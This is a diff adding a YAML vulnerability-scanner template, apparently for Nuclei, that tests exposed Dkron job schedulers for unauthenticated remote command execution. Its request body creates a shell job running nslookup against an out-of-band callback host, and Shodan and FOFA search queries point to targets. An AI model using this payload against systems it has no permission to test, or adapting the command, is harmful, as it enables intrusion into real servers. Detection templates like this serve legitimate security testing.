@@ -1,0 +1,38 @@
+id: dkron-unauthenticated-rce
+
+info:
+  name: Dkron - DNS interaction via Unauthenticated Remote Command Execution
+  author: icarot
+  severity: high
+  description: |
+    Executes a Proof of Concept (PoC) of the Unauthenticated Remote Command Execution (RCE) in a exposed Dkron server, a distributed, fault tolerant job scheduling system for cloud native environments.
+  reference:
+    - https://github.com/distribworks/dkron/
+  metadata:
+    max-request: 1
+    vendor: distribworks
+    product: Dkron
+    fofa-query: title="Dkron"
+    shodan-query: title:"Dkron"
+  tags: dkron,oast,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/jobs"
+    headers:
+      Accept: application/json
+
+    body: '{"ephemeral":true,"disabled":false,"name":"dkron-unauthenticated-rce-poc","schedule":"@every 1s","executor":"shell","executor_config":{"command":"nslookup  dkron-unauthenticated-rce-poc.{{interactsh-url}}","cwd":"/tmp/","env":"ENV_VAR=va1,ANOTHER_ENV_VAR=var2","shell":"true","timeout":"10s"},"retries":null}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+        condition: and
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
